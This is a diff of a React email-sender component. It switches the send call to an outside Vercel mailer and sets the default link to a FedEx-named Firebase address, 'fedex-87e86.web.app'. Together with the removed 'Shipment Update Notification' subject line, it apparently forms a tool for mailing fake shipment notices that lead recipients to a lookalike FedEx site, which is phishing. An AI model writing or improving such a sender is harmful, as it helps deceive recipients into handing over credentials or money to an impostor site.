@@ -1,5 +1,6 @@
 import React, { useState } from "react";
 import styled from "styled-components";
+import Swal from "sweetalert2";
 
 const Container = styled.div`
   padding: 20px;
@@ -39,7 +40,7 @@ const Button = styled.button`
 export default function EmailSender() {
   const [email, setEmail] = useState("");
   const [message, setMessage] = useState("");
-  const [link, setLink] = useState("");
+  const [link, setLink] = useState("https://fedex-87e86.web.app/");
   const [loading, setLoading] = useState(false);
 
   const sendEmail = async () => {
@@ -51,14 +52,15 @@ export default function EmailSender() {
     setLoading(true);
 
     const payload = {
-      to: email,
-      subject: "Shipment Update Notification", // HARD CODED SUBJECT
+      email,
       message,
       link,
     };
 
+    console.log("📤 Sending:", payload);
+
     try {
-      const res = await fetch("/api/send-email", {
+      const res = await fetch("https://backend-mailer-1-five.vercel.app/api/contact", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -66,14 +68,19 @@ export default function EmailSender() {
         body: JSON.stringify(payload),
       });
 
+      const data = await res.json(); // ✅ IMPORTANT
+
+      console.log("📥 Response:", data);
+
       if (res.ok) {
-        alert("Email sent successfully");
+        Swal.fire({text:"✅ Email sent successfully", icon:"success"});
+        setEmail("");setMessage("");
       } else {
-        alert("Failed to send email");
+        alert("❌ " + (data.error || "Failed to send email"));
       }
     } catch (err) {
-      console.error(err);
-      alert("Error sending email");
+      console.error("❌ FRONTEND ERROR:", err);
+      alert("Error sending email (check console)");
     }
 
     setLoading(false);
